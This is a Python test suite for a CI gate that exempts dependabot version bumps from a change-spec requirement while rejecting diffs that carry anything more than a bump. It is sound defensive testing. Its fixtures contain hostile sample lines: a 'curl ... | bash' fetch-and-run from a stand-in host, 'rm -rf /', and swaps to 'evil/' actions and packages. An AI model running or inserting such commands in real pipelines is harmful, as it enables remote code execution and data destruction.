#!/usr/bin/env python3
# np-test: docs | happy+failure
"""The dependency-bump exemption (#306, change spec 0033).

spec-guard and tier-gate both demand a change spec for a high-tier diff, and a
bot cannot write one, so every GitHub Actions update was permanently blocked.

The exemption is from the SPEC requirement only, and it turns on two conditions
that must BOTH hold. The author allowlist alone is the confused-deputy shape
#255 warns about, because a collaborator can push to a dependabot branch while
`pull_request.user.login` stays `dependabot[bot]`. The diff check alone lets any
human skip a spec by shaping a change to look like a bump.

The happy-path fixture is the REAL #280 diff, not a synthetic one, so the
matcher is measured against what dependabot actually produces.
"""
import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
_ENGINE_SETUP = os.path.normpath(os.path.join(HERE, "..", ".."))
if _ENGINE_SETUP not in sys.path:
    sys.path.insert(0, _ENGINE_SETUP)

import np_dependency_bump as dep  # noqa: E402

FIXTURES = os.path.join(_ENGINE_SETUP, "tests", "fixtures", "dependency-bump")
BOT = "dependabot[bot]"


def _real_diff():
    with open(os.path.join(FIXTURES, "pr280-download-artifact.diff"),
              encoding="utf-8") as fh:
        return fh.read()


class TestTheRealDependabotDiff(unittest.TestCase):
    def test_it_is_exempt_for_the_bot(self):
        ok, why = dep.is_spec_exempt(_real_diff(), BOT)
        self.assertTrue(ok, why)

    def test_the_same_diff_is_not_exempt_for_a_human(self):
        """Condition 1. A human touching workflows still writes a spec."""
        ok, why = dep.is_spec_exempt(_real_diff(), "pat-browne")
        self.assertFalse(ok)
        self.assertIn("author", why.lower())

    def test_the_fixture_really_is_a_workflow_version_bump(self):
        """Guard against a fixture that drifted into proving nothing."""
        text = _real_diff()
        self.assertIn(".github/workflows/ci.yml", text)
        self.assertIn("-        uses: actions/download-artifact@v7", text)
        self.assertIn("+        uses: actions/download-artifact@v8", text)


class TestTheConfusedDeputy(unittest.TestCase):
    """Condition 2. The diff, not the identity, carries the security."""

    def test_a_bump_plus_one_unrelated_line_is_not_exempt(self):
        diff = _real_diff() + """
@@ -900,6 +900,7 @@ jobs:
       - name: Innocent looking step
         run: |
           echo hello
+          curl -s https://example.invalid/x.sh | bash
"""
        ok, why = dep.is_spec_exempt(diff, BOT)
        self.assertFalse(ok, "a bot branch with an injected line must not be exempt")
        self.assertIn("not a version bump", why.lower())

    def test_a_non_bump_edit_to_an_allowlisted_file_is_not_exempt(self):
        diff = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1,3 +1,3 @@
 jobs:
-        uses: actions/checkout@v7
+        uses: evil/checkout@v7
"""
        ok, why = dep.is_spec_exempt(diff, BOT)
        self.assertFalse(ok, "only the VERSION may differ")

    def test_unbalanced_added_and_removed_lines_are_not_exempt(self):
        diff = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1,2 +1,3 @@
-        uses: actions/checkout@v7
+        uses: actions/checkout@v8
+        run: rm -rf /
"""
        ok, why = dep.is_spec_exempt(diff, BOT)
        self.assertFalse(ok)

    def test_a_bump_in_a_file_off_the_allowlist_is_not_exempt(self):
        diff = """diff --git a/engine/setup/np_paths.py b/engine/setup/np_paths.py
--- a/engine/setup/np_paths.py
+++ b/engine/setup/np_paths.py
@@ -1,1 +1,1 @@
-VERSION = "1.2.3"
+VERSION = "1.2.4"
"""
        ok, why = dep.is_spec_exempt(diff, BOT)
        self.assertFalse(ok)
        self.assertIn("allowlist", why.lower())

    def test_an_empty_diff_is_not_exempt(self):
        """Nothing to inspect is not the same as inspected and cleared."""
        ok, _ = dep.is_spec_exempt("", BOT)
        self.assertFalse(ok)


class TestThePackageManifestSurface(unittest.TestCase):
    def test_a_package_json_semver_bump_is_exempt(self):
        diff = """diff --git a/engine/setup/tests/e2e/package.json b/engine/setup/tests/e2e/package.json
--- a/engine/setup/tests/e2e/package.json
+++ b/engine/setup/tests/e2e/package.json
@@ -1,3 +1,3 @@
   "devDependencies": {
-    "@playwright/test": "^1.61.0"
+    "@playwright/test": "^1.62.0"
"""
        ok, why = dep.is_spec_exempt(diff, BOT)
        self.assertTrue(ok, why)

    def test_a_renamed_dependency_is_not_exempt(self):
        diff = """diff --git a/engine/setup/tests/e2e/package.json b/engine/setup/tests/e2e/package.json
--- a/engine/setup/tests/e2e/package.json
+++ b/engine/setup/tests/e2e/package.json
@@ -1,3 +1,3 @@
   "devDependencies": {
-    "@playwright/test": "^1.61.0"
+    "@evil/test": "^1.61.0"
"""
        ok, _ = dep.is_spec_exempt(diff, BOT)
        self.assertFalse(ok)


class TestTheMatcherIsAlive(unittest.TestCase):
    """np-kb-test-quality section 15: a matcher that degrades to matching
    nothing would make every case above pass as a clean refusal."""

    def test_the_version_pattern_matches_the_shapes_it_claims_to(self):
        for token in ("@v7", "@v1.2.3", "1.61.0", "^1.62.0", "~2.0.1"):
            self.assertNotEqual(dep.normalize_versions(token), token,
                                "%r should have been normalized" % token)

    def test_normalization_leaves_everything_else_alone(self):
        line = "        uses: actions/download-artifact"
        self.assertEqual(dep.normalize_versions(line), line)

    def test_at_least_one_diff_is_actually_exempt(self):
        """If nothing is ever exempt the whole feature is inert."""
        ok, _ = dep.is_spec_exempt(_real_diff(), BOT)
        self.assertTrue(ok)


class TestBothGatesAgree(unittest.TestCase):
    """The predicate lives in one module precisely so the two gates cannot
    drift. Assert they call the same thing rather than trusting that they do."""

    def test_spec_guard_and_tier_gate_import_the_same_predicate(self):
        import importlib.util

        def load(name, filename):
            path = os.path.join(_ENGINE_SETUP, filename)
            spec = importlib.util.spec_from_file_location(name, path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod

        guard = load("spec_guard_mod", "np-spec-guard.py")
        tier = load("tier_gate_mod", "np-tier-gate.py")
        self.assertIs(guard.np_dependency_bump.is_spec_exempt,
                      tier.np_dependency_bump.is_spec_exempt)


class TestTheGatesEndToEnd(unittest.TestCase):
    """Drive the real scripts over a real git repo, not just the predicate.

    A unit test of is_spec_exempt() cannot show that spec-guard actually calls
    it, nor that tier-gate stops demanding a rollback plan. Both gates exited 1
    on every dependabot PR before this, so both exit codes are the thing under
    test.
    """

    def _repo(self, tmp, changed_line_old, changed_line_new, path=".github/workflows/ci.yml"):
        import subprocess as sp
        env = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t",
                   GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@t")
        def git(*a):
            return sp.run(["git", "-C", tmp, *a], capture_output=True, text=True, env=env)
        sp.run(["git", "init", "-q", "-b", "main", tmp], capture_output=True)
        target = os.path.join(tmp, path)
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with open(target, "w", encoding="utf-8") as fh:
            fh.write("jobs:\n%s\n" % changed_line_old)
        # the registry the gates read
        os.makedirs(os.path.join(tmp, "engine", "setup"), exist_ok=True)
        import shutil
        shutil.copy(os.path.join(_ENGINE_SETUP, "risk-tiers.json"),
                    os.path.join(tmp, "engine", "setup", "risk-tiers.json"))
        git("add", "-A"); git("commit", "-q", "-m", "base")
        git("branch", "-q", "base-ref")
        git("checkout", "-q", "-b", "dependabot/github_actions/thing-8")
        with open(target, "w", encoding="utf-8") as fh:
            fh.write("jobs:\n%s\n" % changed_line_new)
        git("add", "-A"); git("commit", "-q", "-m", "bump")
        return git

    def _run(self, script, tmp, author, extra=()):
        import subprocess as sp
        return sp.run([sys.executable, os.path.join(_ENGINE_SETUP, script),
                       "--root", tmp, "--base", "base-ref", "--head", "HEAD",
                       "--branch", "dependabot/github_actions/thing-8",
                       "--author", author, *extra],
                      capture_output=True, text=True)

    def test_spec_guard_lets_the_bot_bump_through(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            self._repo(tmp, "        uses: actions/download-artifact@v7",
                       "        uses: actions/download-artifact@v8")
            r = self._run("np-spec-guard.py", tmp, BOT)
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
            self.assertIn("dependency-bump exemption", r.stdout)

    def test_spec_guard_still_blocks_the_same_branch_for_a_human(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            self._repo(tmp, "        uses: actions/download-artifact@v7",
                       "        uses: actions/download-artifact@v8")
            r = self._run("np-spec-guard.py", tmp, "pat-browne")
            self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
            self.assertIn("no change-specs/", r.stderr)

    def test_spec_guard_blocks_a_bot_branch_carrying_more_than_a_bump(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            self._repo(tmp, "        uses: actions/download-artifact@v7",
                       "        uses: actions/download-artifact@v8\n        run: curl evil | bash")
            r = self._run("np-spec-guard.py", tmp, BOT)
            self.assertEqual(r.returncode, 1, r.stdout + r.stderr)

    def test_tier_gate_stops_demanding_a_rollback_plan_for_the_bot_bump(self):
        import tempfile, json as _json
        with tempfile.TemporaryDirectory() as tmp:
            self._repo(tmp, "        uses: actions/download-artifact@v7",
                       "        uses: actions/download-artifact@v8")
            out = os.path.join(tmp, "tier-policy.json")
            r = self._run("np-tier-gate.py", tmp, BOT, extra=("--out", out))
            with open(out, encoding="utf-8") as fh:
                decision = _json.load(fh)
            self.assertEqual(decision["tier"], "high")
            self.assertTrue(decision["spec_exempt"])
            self.assertFalse(decision["rollback_required"])
            self.assertFalse(decision["spec_required"])
            self.assertNotIn("rollback", " ".join(decision["problems"]).lower())

    def test_tier_gate_keeps_the_adversarial_lens_requirement(self):
        """The exemption must not shrink the reviewed surface."""
        import tempfile, json as _json
        with tempfile.TemporaryDirectory() as tmp:
            self._repo(tmp, "        uses: actions/download-artifact@v7",
                       "        uses: actions/download-artifact@v8")
            out = os.path.join(tmp, "tier-policy.json")
            self._run("np-tier-gate.py", tmp, BOT, extra=("--out", out))
            with open(out, encoding="utf-8") as fh:
                decision = _json.load(fh)
            self.assertTrue(decision["adversarial_lens_required"])
            self.assertFalse(decision["auto_merge_eligible"])


if __name__ == "__main__":
    unittest.main()
